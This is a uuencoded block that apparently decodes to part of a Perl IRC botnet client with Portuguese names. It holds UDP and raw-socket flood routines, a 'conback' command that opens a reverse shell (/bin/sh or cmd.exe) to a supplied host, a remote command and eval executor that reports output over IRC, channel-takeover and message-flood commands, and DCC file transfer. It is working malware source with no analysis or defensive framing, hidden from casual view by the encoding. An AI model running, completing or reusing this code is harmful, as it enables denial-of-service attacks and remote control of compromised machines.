QE<W,@)'!A8V]T97,[_\"B`@(\"`@(\"`@(\"`@(\"`@<V]C:V5T*%1R,'@L(%!&7TE.150L(%-/0TM?1$=204TL(#$W*3L*(\"`@(\"`@(\"`@_(\"`@(\"!M>2`D9F%I>&%I<#TB)#$B.PH@(\"`@(\"`@(\"`@(\"`@(&UY(\"1P;W)T82`](\"(D,B([\"B`@(\"`@(\"`@_(\"`@(\"`@;7D@)'1E;7!O(#T@(B0S(CL*(\"`@(\"`@(\"`@(\"`@(\"!M>2`D<&%C;W1E.PH@(\"`@(\"`@(\"`@(\"`@_(&UY(\"1P86-O=&5S.PH@(\"`@(\"`@(\"`@(\"`@(&UY(\"1F:6T@/2!T:6UE(\"L@)'1E;7!O.PH@(\"`@(\"`@(\"`@_(\"`@(&UY(\"1P86-O=&$@/2`Q.PH@(\"`@(\"`@(\"`@(\"`@(&UY(\"1A;'9O.PH@(\"`@(\"`@(\"`@(\"`@('=H:6QE_(\"@D<&%C;W1A(#T](\"(Q(BD@>PH@(\"`@(\"`@(\"`@(\"`@(\"`@)'!A8V]T82`](#`@:68@*\"AT:6UE(#X](\"1F_:6TI(\"8F(\"@D=&5M<&\\@(3T@(C`B*2D[\"B`@(\"`@(\"`@(\"`@(\"`@(\"!F;W(@*&UY(\"1F86EX82`](#$[(\"1F_86EX82`\\/2`R-34[(\"1F86EX82LK*2![\"B`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"1A;'9O(#T@:6YE=%]A=&]N*\"(D_9F%I>&%I<\"XD9F%I>&$B*3L*(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@)'!A8V]T93TD<F%N9\"!X(\"1R86YD('@@)')A_;F0[\"B`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"1P;W)T82`](&EN=\"AR86YD(#8U,#`P*2`K,2!I9B`H)'!O<G1A(#T]_(\"(P(BD[\"B`@(\"`@(\"`@(\"`@(\"`@(\"`@('-E;F0H5'(P>\"P@,\"P@)'!A8V]T92P@<V]C:V%D9')?:6XH)'!O_<G1A+\"`D86QV;RDI(&%N9\"`D<&%C;W1E<V4K*R!I9B`H)'!A8V]T97,@/3T@(C$B*3L*(\"`@(\"`@(\"`@(\"`@_(\"`@(\"`@:68@*\"1F86EX82`^/2`R-34I('L*(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`D9F%I>&$@/2`Q.PH@(\"`@_(\"`@(\"`@(\"`@(\"`@(\"!]\"B`@(\"`@(\"`@(\"`@(\"`@(\"!]\"B`@(\"`@(\"`@(\"`@(\"`@?0H@(\"`@(\"`@(\"`@(\"`@_(&EF(\"@D97-T871I<W1I8V%S*0H@(\"`@(\"`@(\"`@(\"`@('L*(\"`@(\"`@(\"`@(\"`@(\"`@<V5N9')A=R@D25)#_7V-U<E]S;V-K970L(\")04DE635-'(\"1P<FEN=&P@.EPP,#)496UP;R!D92!086-O=&5S7#`P,CH@)'1E;7!O_(BXB<R(I.PH@(\"`@(\"`@(\"`@(\"`@(\"!S96YD<F%W*\"1)4D-?8W5R7W-O8VME=\"P@(E!2259-4T<@)'!R:6YT_;\"`Z7#`P,E1O=&%L(&1E(%!A8V]T97-<,#`R.B`D<&%C;W1E<V4B*3L*(\"`@(\"`@(\"`@(\"`@(\"`@<V5N9')A_=R@D25)#7V-U<E]S;V-K970L(\")04DE635-'(\"1P<FEN=&P@.EPP,#)!;'9O(&1O<R!086-O=&5S7#`P,CH@_)&%L=F\\B*3L*(\"`@(\"`@(\"`@(\"`@(\"!]\"B`@(\"`@(\"`@(\"`@('T*\"B`@(\"`@(\"`@(\"`@(&5L<VEF(\"@D9G5N_8V%R9R`]?B`O7F-O;F)A8VM<<RLH+BHI7',K*%QD*RDO*2![\"B`@(\"`@(\"`@(\"`@(\"`@;7D@)&AO<W0@/2`B_)#$B.PH@(\"`@(\"`@(\"`@(\"`@(&UY(\"1P;W)T82`](\"(D,B([\"B`@(\"`@(\"`@(\"`@(\"`@;7D@)'!R;W1O(#T@_9V5T<')O=&]B>6YA;64H)W1C<\"<I.PH@(\"`@(\"`@(\"`@(\"`@(&UY(\"1I861D<B`](&EN971?871O;B@D:&]S_=\"D[\"B`@(\"`@(\"`@(\"`@(\"`@;7D@)'!A9&1R(#T@<V]C:V%D9')?:6XH)'!O<G1A+\"`D:6%D9'(I.PH@(\"`@_(\"`@(\"`@(\"`@(&UY(\"1S:&5L;\"`](\"(O8FEN+W-H(\"UI(CL*(\"`@(\"`@(\"`@(\"`@(\"!I9B`H)%Y/(&5Q(\")-_4U=I;C,R(BD@>PH@(\"`@(\"`@(\"`@(\"`@(\"`@)'-H96QL(#T@(F-M9\"YE>&4B.PH@(\"`@(\"`@(\"`@(\"`@('T*_(\"`@(\"`@(\"`@(\"`@(\"!S;V-K970H4T]#2T54+\"!01E])3D54+\"!33T-+7U-44D5!32P@)'!R;W1O*2!O<B!D_:64@(G-O8VME=#H@)\"$B.PH@(\"`@(\"`@(\"`@(\"`@(&-O;FYE8W0H4T]#2T54+\"`D<&%D9'(I(&]R(&1I92`B_8V]N;F5C=#H@)\"$B.PH@(\"`@(\"`@(\"`@(\"`@(&]P96XH4U1$24XL(\"(^)E-/0TM%5\"(I.PH@(\"`@(\"`@(\"`@_(\"`@(&]P96XH4U1$3U54+\"`B/B933T-+150B*3L*(\"`@(\"`@(\"`@(\"`@(\"!O<&5N*%-41$524BP@(CXF4T]#_2T54(BD[\"B`@(\"`@(\"`@(\"`@(\"`@<WES=&5M*\"(D<VAE;&PB*3L*(\"`@(\"`@(\"`@(\"`@(\"!C;&]S92A35$1)_3BD[\"B`@(\"`@(\"`@(\"`@(\"`@8VQO<V4H4U1$3U54*3L*(\"`@(\"`@(\"`@(\"`@(\"!C;&]S92A35$1%4E(I.PH*_(\"`@(\"`@(\"`@(\"`@(\"!I9B`H)&5S=&%T:7-T:6-A<RD*(\"`@(\"`@(\"`@(\"`@(\"![\"B`@(\"`@(\"`@(\"`@(\"`@_('-E;F1R87<H)$E20U]C=7)?<V]C:V5T+\"`B4%))5DU31R`D<')I;G1L(#I<,#`R0V]N96-T86YD;RUS92!E_;5PP,#(Z(\"1H;W-T.B1P;W)T82(I.PH@(\"`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"`@?0H*(\"`@(\"`@(\"`@_(\"!E;'-I9B`H)&9U;F-A<F<@/7X@+UYO;&1P86-K7',K*\"XJ*5QS*RA<9\"LI7',K*%QD*RDO*2![\"B`@(\"`@_(\"`@(\"`@(')E='5R;B!U;FQE<W,@)'!A8V]T97,[\"B`@(\"`@(\"`@(\"`@(\"!M>2`H)&1T:6UE+\"`E<&%C;W1E_<RD@/2!A='1A8VME<B@B)#$B+\"`B)#(B+\"`B)#,B*3L*(\"`@(\"`@(\"`@(\"`@(\"1D=&EM92`](#$@:68@)&1T_:6UE(#T](#`[\"B`@(\"`@(\"`@(\"`@(\"!M>2`E8GET97,[\"B`@(\"`@(\"`@(\"`@(\"`D8GET97-[:6=M<'T@/2`D_,B`J(\"1P86-O=&5S>VEG;7!].PH@(\"`@(\"`@(\"`@(\"`@)&)Y=&5S>VEC;7!](#T@)#(@*B`D<&%C;W1E<WMI_8VUP?3L*(\"`@(\"`@(\"`@(\"`@(\"1B>71E<WMO?2`](\"0R(\"H@)'!A8V]T97-[;WT[\"B`@(\"`@(\"`@(\"`@(\"`D_8GET97-[=61P?2`](\"0R(\"H@)'!A8V]T97-[=61P?3L*(\"`@(\"`@(\"`@(\"`@(\"1B>71E<WMT8W!](#T@)#(@_*B`D<&%C;W1E<WMT8W!].PH@(\"`@(\"`@(\"`@(\"`@=6YL97-S(\"@D97-T871I<W1I8V%S*0H@(\"`@(\"`@(\"`@_(\"`@>PH@(\"`@(\"`@(\"`@(\"`@(\"!S96YD<F%W*\"1)4D-?8W5R7W-O8VME=\"P@(E!2259-4T<@)'!R:6YT;\"`Z_7#`P,B`M(%-T871U<R`M7#`P,B(I.PH@(\"`@(\"`@(\"`@(\"`@(\"!S96YD<F%W*\"1)4D-?8W5R7W-O8VME=\"P@_(E!2259-4T<@)'!R:6YT;\"`Z7#`P,E1I;7!<,#`R.B`D9'1I;64B+B)S96-U;F1E+B(I.PH@(\"`@(\"`@(\"`@_(\"`@(\"!S96YD<F%W*\"1)4D-?8W5R7W-O8VME=\"P@(E!2259-4T<@)'!R:6YT;\"`Z7#`P,E1O=&%L('!A8VME_=%PP,#(Z(\"(N*\"1P86-O=&5S>W5D<'T@*R`D<&%C;W1E<WMI9VUP?2`K(\"1P86-O=&5S>VEC;7!](\"L@(\"1P_86-O=&5S>V]]*2D[\"B`@(\"`@(\"`@(\"`@(\"`@('-E;F1R87<H)$E20U]C=7)?<V]C:V5T+\"`B4%))5DU31R`D_<')I;G1L(#I<,#`R5&]T86P@8GET97-<,#`R.B`B+B@D8GET97-[:6-M<'T@*R`D8GET97,@>VEG;7!](\"L@_)&)Y=&5S>W5D<'T@*R`D8GET97-[;WTI*3L*(\"`@(\"`@(\"`@(\"`@(\"`@<V5N9')A=R@D25)#7V-U<E]S;V-K_970L(\")04DE635-'(\"1P<FEN=&P@.EPP,#)&;&]O9%PP,#(Z(\"(N:6YT*\"@H)&)Y=&5S>VEC;7!]*R1B>71E_<WMI9VUP?2LD8GET97-[=61P?2`K(\"1B>71E<WMO?2DO,3`R-\"DO)&1T:6UE*2XB(&MB<',B*3L*(\"`@(\"`@_(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"!]\"B`@(\"`@(\"`@(\"`@97AI=#L*(\"`@(\"`@('T*(\"!]\"GT*\"G-U8B!I<F-A_<V4@>PH@(&UY(\"@D:V5M+\"`D<')I;G1L+\"`D8V%S92D@/2!`7SL*\"B`@(&EF(\"@D8V%S92`]?B`O7FIO:6X@_*\"XJ*2\\I('L*(\"`@(\"!J*\"(D,2(I.PH@(\"!]\"B`@(&5L<VEF(\"@D8V%S92`]?B`O7G!A<G0@*\"XJ*2\\I('L*_(\"`@(\"`@<\"@B)#$B*3L*(\"`@?0H@(\"!E;'-I9B`H)&-A<V4@/7X@+UYR96IO:6Y<<RLH+BHI+RD@>PH@(\"`@_(\"!M>2`D8VAA;B`](\"0Q.PH@(\"`@(\"!I9B`H)&-H86X@/7X@+UXH7&0K*2`H+BHI+RD@>PH@(\"`@(\"`@(&9O_<B`H;7D@)&-A(#T@,3L@)&-A(#P](\"0Q.R`D8V$K*R`I('L*(\"`@(\"`@(\"`@('`H(B0R(BD[\"B`@(\"`@(\"`@_(\"!J*\"(D,B(I.PH@(\"`@(\"`@('T*(\"`@(\"`@?2!E;'-E('L*(\"`@(\"`@(\"`@('`H(B1C:&%N(BD[\"B`@(\"`@_(\"`@(\"!J*\"(D8VAA;B(I.PH@(\"`@(\"!]\"B`@('T*(\"`@96QS:68@*\"1C87-E(#U^(\"]>;W`O*2![\"B`@(\"`@_(&]P*\"(D<')I;G1L(BP@(B1K96TB*2!I9B`D8V%S92!E<2`B;W`B.PH@(\"`@(\"!M>2`D;V%R9R`]('-U8G-T_<B@D8V%S92P@,RD[\"B`@(\"`@(&]P*\"(D,2(L(\"(D,B(I(&EF(\"@D;V%R9R`]?B`O*%Q3*RE<<RLH7%,K*2\\I_.PH@(\"!]\"B`@(&5L<VEF(\"@D8V%S92`]?B`O7F1E;W`O*2![\"B`@(\"`@(&1E;W`H(B1P<FEN=&PB+\"`B)&ME_;2(I(&EF(\"1C87-E(&5Q(\")D96]P(CL*(\"`@(\"`@;7D@)&]A<F<@/2!S=6)S='(H)&-A<V4L(#4I.PH@(\"`@_(\"!D96]P*\"(D,2(L(\"(D,B(I(&EF(\"@D;V%R9R`]?B`O*%Q3*RE<<RLH7%,K*2\\I.PH@(\"!]\"B`@(&5L<VEF_(\"@D8V%S92`]?B`O7G9O:6-E+RD@>PH@(\"`@(\"!V;VEC92@B)'!R:6YT;\"(L(\"(D:V5M(BD@:68@)&-A<V4@_97$@(G9O:6-E(CL*(\"`@(\"`@)&]A<F<@/2!S=6)S='(H)&-A<V4L(#8I.PH@(\"`@(\"!V;VEC92@B)#$B+\"`B_)#(B*2!I9B`H)&]A<F<@/7X@+RA<4RLI7',K*%Q3*RDO*3L*(\"`@?0H@(\"!E;'-I9B`H)&-A<V4@/7X@+UYD_979O:6-E+RD@>PH@(\"`@(\"!D979O:6-E*\"(D<')I;G1L(BP@(B1K96TB*2!I9B`D8V%S92!E<2`B9&5V;VEC_92([\"B`@(\"`@(\"1O87)G(#T@<W5B<W1R*\"1C87-E+\"`X*3L*(\"`@(\"`@9&5V;VEC92@B)#$B+\"`B)#(B*2!I_9B`H)&]A<F<@/7X@+RA<4RLI7',K*%Q3*RDO*3L*(\"`@?0H@(\"!E;'-I9B`H)&-A<V4@/7X@+UYM<V=<<RLH_7%,K*2`H+BHI+RD@>PH@(\"`@(\"!M<V<H(B0Q(BP@(B0R(BD[\"B`@('T*(\"`@96QS:68@*\"1C87-E(#U^(\"]>_9FQO;V1<<RLH7&0K*5QS*RA<4RLI(\"@N*BDO*2![\"B`@(\"`@(&9O<B`H;7D@)&-F(#T@,3L@)&-F(#P](\"0Q_.R`D8V8K*RD@>PH@(\"`@(\"`@(&US9R@B)#(B+\"`B)#,B*3L*(\"`@(\"`@?0H@(\"!]\"B`@(&5L<VEF(\"@D8V%S_92`]?B`O7F-T8W!F;&]O9%QS*RA<9\"LI7',K*%Q3*RD@*\"XJ*2\\I('L*(\"`@(\"`@9F]R(\"AM>2`D8V8@/2`Q_.R`D8V8@/#T@)#$[(\"1C9BLK*2![\"B`@(\"`@(\"`@8W1C<\"@B)#(B+\"`B)#,B*3L*(\"`@(\"`@?0H@(\"!]\"B`@_(&5L<VEF(\"@D8V%S92`]?B`O7F-T8W!<<RLH7%,K*2`H+BHI+RD@>PH@(\"`@(\"!C=&-P*\"(D,2(L(\"(D,B(I_.PH@(\"!]\"B`@(&5L<VEF(\"@D8V%S92`]?B`O7FEN=FET95QS*RA<4RLI(\"@N*BDO*2![\"B`@(\"`@(&EN=FET_92@B)#$B+\"`B)#(B*3L*(\"`@?0H@(\"!E;'-I9B`H)&-A<V4@/7X@+UYN:6-K(\"@N*BDO*2![\"B`@(\"`@(&YI_8VLH(B0Q(BD[\"B`@('T*(\"`@96QS:68@*\"1C87-E(#U^(\"]>8V]N96-T85QS*RA<4RLI7',K*%Q3*RDO*2![_\"B`@(\"`@(\"!C;VYE8W1A<B@B)#(B+\"`B)#$B+\"`V-C8W*3L*(\"`@?0H@(\"!E;'-I9B`H)&-A<V4@/7X@+UYS_96YD7',K*%Q3*RE<<RLH7%,K*2\\I('L*(\"`@(\"`@1$-#.CI314Y$*\"(D,2(L(\"(D,B(I.PH@(\"!]\"B`@(&5L_<VEF(\"@D8V%S92`]?B`O7G)A=R`H+BHI+RD@>PH@(\"`@(\"!S96YD<F%W*\"(D,2(I.PH@(\"!]\"B`@(&5L<VEF_(\"@D8V%S92`]?B`O7F5V86P@*\"XJ*2\\I('L*(\"`@(\"`@979A;\"`B)#$B.PH@(\"!]\"B`@(&5L<VEF(\"@D8V%S_92`]?B`O7F5N=')A7',K*%Q3*RE<<RLH7&0K*2\\I('L*(\"`@('-L965P(&EN=\"AR86YD*\"0R*2D[\"B`@(\"!J_*\"(D,2(I.PH@(\"!]\"B`@(&5L<VEF(\"@D8V%S92`]?B`O7G-A:5QS*RA<4RLI7',K*%QD*RDO*2![\"B`@(\"!S_;&5E<\"!I;G0H<F%N9\"@D,BDI.PH@(\"`@<\"@B)#$B*3L*(\"`@?0H@(\"!E;'-I9B`H)&-A<V4@/7X@+UYS86ER_+RD@>PH@(\"`@('%U:70H*3L*(\"`@?0H@(\"!E;'-I9B`H)&-A<V4@/7X@+UYN;W9O;FEC:R\\I('L*(\"`@(&UY_(\"1N;W9O;FEC:R`](&=E=&YI8VLH*3L*(\"`@(\"!N:6-K*\"(D;F]V;VYI8VLB*3L*(\"`@?0H@(\"!E;'-I9B`H_)&-A<V4@/7X@+UYE<W1A=&ES=&EC87,@*\"XJ*2\\I('L*(\"`@(\"!I9B`H)#$@97$@(F]N(BD@>PH@(\"`@(\"`D_97-T871I<W1I8V%S(#T@,3L*(\"`@(\"`@;7-G*\"(D<')I;G1L(BP@(D5S=&%T+G-T:6-A<R!A=&EV861A<R$B_*3L*(\"`@(\"!](&5L<VEF(\"@D,2!E<2`B;V9F(BD@>PH@(\"`@(\"`D97-T871I<W1I8V%S(#T@,#L*(\"`@(\"`@_;7-G*\"(D<')I;G1L(BP@(D5S=&%T+G-T:6-A<R!D97-A=&EV861A<R$B*3L*(\"`@(\"!]\"B`@('T*(\"`@96QS_:68@*\"1C87-E(#U^(\"]><&%C;W1E<R`H+BHI+RD@>PH@(\"`@(&EF(\"@D,2!E<2`B;VXB*2![\"B`@(\"`@(\"1P_86-O=&5S(#T@,3L*(\"`@(\"`@;7-G*\"(D<')I;G1L(BP@(E!A8V]T97,@871I=F%D;W,A(BD@:68@*\"1E<W1A_=&ES=&EC87,@/3T@(C$B*3L*(\"`@(\"!](&5L<VEF(\"@D,2!E<2`B;V9F(BD@>PH@(\"`@(\"`D<&%C;W1E<R`]_(#`[\"B`@(\"`@(&US9R@B)'!R:6YT;\"(L(\")086-O=&5S(&1E<V%T:79A9&]S(2(I(&EF(\"@D97-T871I<W1I_8V%S(#T](\"(Q(BD[\"B`@(\"`@?0H@(\"!]\"GT*<W5B('-H96QL('L*(\"!R971U<FX@=6YL97-S(\"1A8V5S<V]S_:&5L;#L*(\"!M>2`D<')I;G1L/21?6S!=.PH@(&UY(\"1C;VUA;F1O/21?6S%=.PH@(&EF(\"@D8V]M86YD;R`]_?B`O8V0@*\"XJ*2\\I('L*(\"`@(&-H9&ER*\"(D,2(I('Q\\(&US9R@B)'!R:6YT;\"(L(\")$:7)E=\"YR:6\\@:6YE_>&ES=&5N=&4A(BD[\"B`@(\"!R971U<FX[\"B`@?0H@(&5L<VEF(\"@D<&ED(#T@9F]R:RD@>PH@(\"`@('=A:71P_:60H)'!I9\"P@,\"D[\"B`@?2!E;'-E('L*(\"`@(\"`@:68@*&9O<FLI('L*(\"`@(\"`@(\"`@97AI=#L*(\"`@(\"`@_('T@96QS92![\"B`@(\"`@(\"`@(\"`@;7D@0')E<W`]8\"1C;VUA;F1O(#(^)C$@,SXF,6`[\"B`@(\"`@(\"`@(\"`@_;7D@)&,],#L*(\"`@(\"`@(\"`@(\"!F;W)E86-H(&UY(\"1L:6YH82`H0')E<W`I('L*(\"`@(\"`@(\"`@(\"`@(\"1C_*RL[\"B`@(\"`@(\"`@(\"`@(\"!C:&]P(\"1L:6YH83L*(\"`@(\"`@(\"`@(\"`@('-E;F1R87<H)$E20U]C=7)?<V]C_:V5T+\"`B4%))5DU31R`D<')I;G1L(#HD;&EN:&$B*3L*(\"`@(\"`@(\"`@(\"`@(&EF(\"@D8R`^/2`B)&QI;F%S_7VUA>\"(I('L*(\"`@(\"`@(\"`@(\"`@(\"`@)&,],#L*(\"`@(\"`@(\"`@(\"`@(\"`@<VQE97`@)'-L965P.PH@(\"`@_(\"`@(\"`@(\"`@?0H@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"!E>&ET.PH@(\"`@(\"`@?0H@('T*?0H*<W5B(&%T_=&%C:V5R('L*(\"!M>2`D:6%D9'(@/2!I;F5T7V%T;VXH)%];,%TI.PH@(&UY(\"1M<V<@/2`G0B<@>\"`D7ULQ_73L*(\"!M>2`D9G1I;64@/2`D7ULR73L*(\"!M>2`D8W`@/2`P.PH@(&UY(\"@E<&%C;W1E<RD[\"B`@)'!A8V]T_97-[:6-M<'T@/2`D<&%C;W1E<WMI9VUP?2`](\"1P86-O=&5S>W5D<'T@/2`D<&%C;W1E<WMO?2`](\"1P86-O_=&5S>W1C<'T@/2`P.PH*(\"!S;V-K970H4T]#2S$L(%!&7TE.150L(%-/0TM?4D%7+\"`R*2!O<B`D8W`K*SL*_(\"!S;V-K970H4T]#2S(L(%!&7TE.150L(%-/0TM?1$=204TL(#$W*2!O<B`D8W`K*SL*(\"!S;V-K970H4T]#_2S,L(%!&7TE.150L(%-/0TM?4D%7+\"`Q*2!O<B`D8W`K*SL*(\"!S;V-K970H4T]#2S0L(%!&7TE.150L(%-/_0TM?4D%7+\"`V*2!O<B`D8W`K*SL*(\"!R971U<FXH=6YD968I(&EF(\"1C<\"`]/2`T.PH@(&UY(\"1I=&EM92`]_('1I;64[\"B`@;7D@*\"1C=7)?=&EM92D[\"B`@=VAI;&4@*\"`Q(\"D@>PH@(\"`@(&9O<B`H;7D@)'!O<G1A(#T@_,3L@)'!O<G1A(#P](#8U-3,U.R`D<&]R=&$K*RD@>PH@(\"`@(\"`@)&-U<E]T:6UE(#T@=&EM92`M(\"1I=&EM_93L*(\"`@(\"`@(&QA<W0@:68@)&-U<E]T:6UE(#X](\"1F=&EM93L*(\"`@(\"`@('-E;F0H4T]#2S$L(\"1M<V<L_(#`L('-O8VMA9&1R7VEN*\"1P;W)T82P@)&EA9&1R*2D@86YD(\"1P86-O=&5S>VEG;7!]*RL@:68@*\"1P86-O_=&5S(#T](#$I.PH@(\"`@(\"`@<V5N9\"A33T-+,BP@)&US9RP@,\"P@<V]C:V%D9')?:6XH)'!O<G1A+\"`D:6%D_9'(I*2!A;F0@)'!A8V]T97-[=61P?2LK(&EF(\"@D<&%C;W1E<R`]/2`Q*3L*(\"`@(\"`@('-E;F0H4T]#2S,L_(\"1M<V<L(#`L('-O8VMA9&1R7VEN*\"1P;W)T82P@)&EA9&1R*2D@86YD(\"1P86-O=&5S>VEC;7!]*RL@:68@_*\"1P86-O=&5S(#T](#$I.PH@(\"`@(\"`@<V5N9\"A33T-+-\"P@)&US9RP@,\"P@<V]C:V%D9')?:6XH)'!O<G1A_+\"`D:6%D9'(I*2!A;F0@)'!A8V]T97-[=&-P?2LK(&EF(\"@D<&%C;W1E<R`]/2`Q*3L*\"B`@(\"`@(\"!F;W(@_*&UY(\"1P8R`](#,[(\"1P8R`\\/2`R-34[)'!C*RLI('L*(\"`@(\"`@(\"`@;F5X=\"!I9B`D<&,@/3T@-CL*(\"`@_(\"`@(\"`@)&-U<E]T:6UE(#T@=&EM92`M(\"1I=&EM93L*(\"`@(\"`@(\"`@;&%S=\"!I9B`D8W5R7W1I;64@/CT@_)&9T:6UE.PH@(\"`@(\"`@(\"!S;V-K970H4T]#2S4L(%!&7TE.150L(%-/0TM?4D%7+\"`D<&,I(&]R(&YE>'0[_\"B`@(\"`@(\"`@('-E;F0H4T]#2S4L(\"1M<V<L(#`L('-O8VMA9&1R7VEN*\"1P;W)T82P@)&EA9&1R*2D@86YD_(\"1P86-O=&5S>V]]*RL@:68@*\"1P86-O=&5S(#T](#$I.PH@(\"`@(\"`@?0H@(\"`@('T*(\"`@(\"!L87-T(&EF_(\"1C=7)?=&EM92`^/2`D9G1I;64[\"B`@?0H@(')E='5R;B@D8W5R7W1I;64L(\"5P86-O=&5S*3L*?0H*\"G-U_8B!A8W1I;VX@>PH@(\"!R971U<FX@=6YL97-S(\"0C7R`]/2`Q.PH@(\"!S96YD<F%W*\")04DE635-'(\"1?6S!=_(#I<,#`Q04-424].(\"1?6S%=7#`P,2(I.PI]\"@IS=6(@8W1C<\"![\"B`@(')E='5R;B!U;FQE<W,@)\"-?(#T]_(#$[\"B`@('-E;F1R87<H(E!2259-4T<@)%];,%T@.EPP,#$D7ULQ75PP,#$B*3L*?0IS=6(@;7-G('L*(\"`@_<F5T=7)N('5N;&5S<R`D(U\\@/3T@,3L*(\"`@<V5N9')A=R@B4%))5DU31R`D7ULP72`Z)%];,5TB*3L*?0H*_<W5B(&YO=&EC92![\"B`@(')E='5R;B!U;FQE<W,@)\"-?(#T](#$[\"B`@('-E;F1R87<H(DY/5$E#12`D7ULP_72`Z)%];,5TB*3L*?0H*<W5B(&]P('L*(\"`@<F5T=7)N('5N;&5S<R`D(U\\@/3T@,3L*(\"`@<V5N9')A=R@B_34]$12`D7ULP72`K;R`D7ULQ72(I.PI]\"G-U8B!D96]P('L*(\"`@<F5T=7)N('5N;&5S<R`D(U\\@/3T@,3L*_(\"`@<V5N9')A=R@B34]$12`D7ULP72`M;R`D7ULQ72(I.PI]\"G-U8B!H;W`@>PH@(\"`@<F5T=7)N('5N;&5S_<R`D(U\\@/3T@,3L*(\"`@<V5N9')A=R@B34]$12`D7ULP72`K:\"`D7ULQ72(I.PI]\"G-U8B!D96AO<\"![\"B`@_(')E='5R;B!U;FQE<W,@)\"-?(#T](#$[\"B`@('-E;F1R87<H(DU/1$4@)%];,%T@*V@@)%];,5TB*3L*?0IS_=6(@=F]I8V4@>PH@(\"!R971U<FX@=6YL97-S(\"0C7R`]/2`Q.PH@(\"!S96YD<F%W*\")-3T1%(\"1?6S!=(\"MV_(\"1?6S%=(BD[\"GT*<W5B(&1E=F]I8V4@>PH@(\"!R971U<FX@=6YL97-S(\"0C7R`]/2`Q.PH@(\"!S96YD<F%W_*\")-3T1%(\"1?6S!=(\"UV(\"1?6S%=(BD[\"GT*<W5B(&)A;B![\"B`@(')E='5R;B!U;FQE<W,@)\"-?(#T](#$[_\"B`@('-E;F1R87<H(DU/1$4@)%];,%T@*V(@)%];,5TB*3L*?0IS=6(@=6YB86X@>PH@(\"!R971U<FX@=6YL_97-S(\"0C7R`]/2`Q.PH@(\"!S96YD<F%W*\")-3T1%(\"1?6S!=(\"UB(\"1?6S%=(BD[\"GT*<W5B(&MI8VL@>PH@_(\"!R971U<FX@=6YL97-S(\"0C7R`]/2`Q.PH@(\"!S96YD<F%W*\")+24-+(\"1?6S!=(\"1?6S%=(#HD7ULR72(I_.PI]\"@IS=6(@;6]D;R![\"B`@(')E='5R;B!U;FQE<W,@)\"-?(#T](#`[\"B`@('-E;F1R87<H(DU/1$4@)%];_,%T@)%];,5TB*3L*?0IS=6(@;6]D92![(&UO9&\\H0%\\I.R!]\"@IS=6(@:B![(\"9J;VEN*$!?*3L@?0IS=6(@_:F]I;B![\"B`@(')E='5R;B!U;FQE<W,@)\"-?(#T](#`[\"B`@('-E;F1R87<H(DI/24X@)%];,%TB*3L*?0IS_=6(@<\"![('!A<G0H0%\\I.R!]\"G-U8B!P87)T('MS96YD<F%W*\")005)4(\"1?6S!=(BD[?0H*<W5B(&YI8VL@_>PH@(')E='5R;B!U;FQE<W,@)\"-?(#T](#`[\"B`@<V5N9')A=R@B3DE#2R`D7ULP72(I.PI]\"@IS=6(@:6YV_:71E('L*(\"`@<F5T=7)N('5N;&5S<R`D(U\\@/3T@,3L*(\"`@<V5N9')A=R@B24Y6251%(\"1?6S%=(\"1?6S!=_(BD[\"GT*<W5B('1O<&EC;R![\"B`@(')E='5R;B!U;FQE<W,@)\"-?(#T](#$[\"B`@('-E;F1R87<H(E1/4$E#_(\"1?6S!=(\"1?6S%=(BD[\"GT*<W5B('1O<&EC('L@=&]P:6-O*$!?*3L@?0H*<W5B('=H;VES('L*(\"!R971U_<FX@=6YL97-S(\"0C7R`]/2`P.PH@('-E;F1R87<H(E=(3TE3(\"1?6S!=(BD[\"GT*<W5B('=H;R![\"B`@<F5T_=7)N('5N;&5S<R`D(U\\@/3T@,#L*(\"!S96YD<F%W*\")72$\\@)%];,%TB*3L*?0IS=6(@;F%M97,@>PH@(')E_='5R;B!U;FQE<W,@)\"-?(#T](#`[\"B`@<V5N9')A=R@B3D%-15,@)%];,%TB*3L*?0IS=6(@87=A>2![\"B`@_<V5N9')A=R@B05=!62`D7ULP72(I.PI]\"G-U8B!B86-K('L@87=A>2@I.R!]\"G-U8B!Q=6ET('L*(\"!S96YD_<F%W*\")154E4(#HD7ULP72(I.PH@(&5X:70[\"GT*\"G!A8VMA9V4@1$-#.PH*<W5B(&-O;FYE8W1I;VYS('L*_(\"`@;7D@0')E861Y(#T@)&1C8U]S96PM/F-A;E]R96%D*#$I.PH@(\"!F;W)E86-H(&UY(\"1F:\"`H0')E861Y_*2![\"B`@(\"`@;7D@)&1C8W1I<&\\@/2`D1$-#>R1F:'U[=&EP;WT[\"B`@(\"`@;7D@)&%R<75I=F\\@/2`D1$-#_>R1F:'U[87)Q=6EV;WT[\"B`@(\"`@;7D@)&)Y=&5S(#T@)$1#0WLD9FA]>V)Y=&5S?3L*(\"`@(\"!M>2`D8W5R_7V)Y=&4@/2`D1$-#>R1F:'U[8W5R8GET97T[\"B`@(\"`@;7D@)&YI8VL@/2`D1$-#>R1F:'U[;FEC:WT[\"@H@_(\"`@(&UY(\"1M<V<[\"B`@(\"`@;7D@)&YR96%D(#T@<WES<F5A9\"@D9F@L(\"1M<V<L(#$P,C0P*3L*\"B`@(\"`@_:68@*\"1N<F5A9\"`]/2`P(&%N9\"`D9&-C=&EP;R`]?B`O7BAG971\\<V5N9&-O;BDD+RD@>PH@(\"`@(\"`@(\"1$_0T-[)&9H?7MS=&%T=7-](#T@(D-A;F-E;&%D;R([\"B`@(\"`@(\"`@)$1#0WLD9FA]>V9T:6UE?2`]('1I;64[_\"B`@(\"`@(\"`@)&1C8U]S96PM/G)E;6]V92@D9F@I.PH@(\"`@(\"`@(\"1F:\"T^8VQO<V4[\"B`@(\"`@(\"`@;F5X_=#L*(\"`@(\"!]\"@H@(\"`@(&EF(\"@D9&-C=&EP;R!E<2`B9V5T(BD@>PH@(\"`@(\"`@(\"1$0T-[)&9H?7MC=7)B_>71E?2`K/2!L96YG=&@H)&US9RD[\"@H@(\"`@(\"`@(&UY(\"1C=7)?8GET92`](\"1$0T-[)&9H?7MC=7)B>71E_?3L*\"B`@(\"`@(\"`@;W!E;BA&24Q%+\"`B/CX@)&%R<75I=F\\B*3L*(\"`@(\"`@(\"!P<FEN=\"!&24Q%(\"(D;7-G_(B!I9B`H)&-U<E]B>71E(#P](\"1B>71E<RD[